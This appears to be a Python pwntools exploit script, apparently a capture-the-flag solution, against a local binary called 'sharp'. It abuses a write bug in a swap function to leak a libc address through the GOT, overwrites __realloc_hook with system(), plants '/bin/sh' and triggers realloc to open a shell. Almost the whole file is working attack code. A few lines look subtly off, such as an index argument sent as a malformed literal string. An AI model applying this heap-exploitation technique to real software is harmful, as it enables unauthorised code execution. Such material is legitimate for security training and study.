from pwn import *
elf = context.binary = ELF("./sharp")
libc = ELF("./libc-2.31.so")
context.log_level = 'info'
gs = '''
continue
'''

# Sequential counter Index for allocated users chunks.
index = 0


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def add(name):
    global index
    index += 1
    io.sendline("1")
    io.sendline(name)
    return index-1


def print_users():
    io.sendline("5")


def remove(x):
    io.sendline("2")
    io.sendline(f'{x}'.encode())


def edit(x, name):
    io.sendline("3")
    io.sendline(f'{x}'.encode())
    io.sendline(name)


def swap(x, y):
    io.sendline("4")
    # data will be copied to this index x from y anyway
    io.sendline(f'{x}.encode()')
    io.send(y+b'\n')  # This is the index we have a write bug on!


io = start()
io.timeout = 0.1

# We want to fill the initial users pointers array
# So that upon call to add_user(), realloc will be invoked
first = add("FIRST")
second = add("SECOND")
third = add("THIRD")

# Padding of length equal to size of swap_users() local input buffer
SWAP_PADDING_SIZE = 0x10

HOOK_OFFSET_FIX = 27
HOOK_SYMBOL = '__realloc_hook'

# 1. Leak a libc address and set base addr
payload = b''
payload += b"A"*SWAP_PADDING_SIZE
payload += p64(elf.got['puts'])
swap(second, payload)
print_users()
io.readuntil("Entry: 0, user: ")
io.readuntil("Entry: 0, user: ")
leak = u64(io.readline().strip().ljust(8, b"\x00"))
log.info(f'got["puts"] @ {hex(leak)}')
libc.address = leak - libc.symbols['puts']
log.info(f'libc base @ {hex(libc.address)}')


# 2. Overwrite the malloc hook with system() addr

# Write into ptr_array[0] an address smaller then that of the hook we wish to override
# We'll need an addr to data which has a big enough int fake size field 8 bytes before it
payload = b''
payload += b"A"*SWAP_PADDING_SIZE
payload += p64(libc.symbols[HOOK_SYMBOL]-HOOK_OFFSET_FIX)
swap(second, payload)

payload = b''
payload += b"A"*HOOK_OFFSET_FIX
payload += p64(libc.symbols['system'])
edit(first, payload)

# 3. Write the bin/sh string to the third user name pointer
payload = b''
payload += b"C"*SWAP_PADDING_SIZE  # padding for swap

# "sh" might also work, Dash is alway present and can be also invoked with less characters
payload += b"/bin/sh\0"
swap(second, payload)

# 3. Pop a shell
add("AbraKadabra!")  # Any non empty input will work
io.interactive()
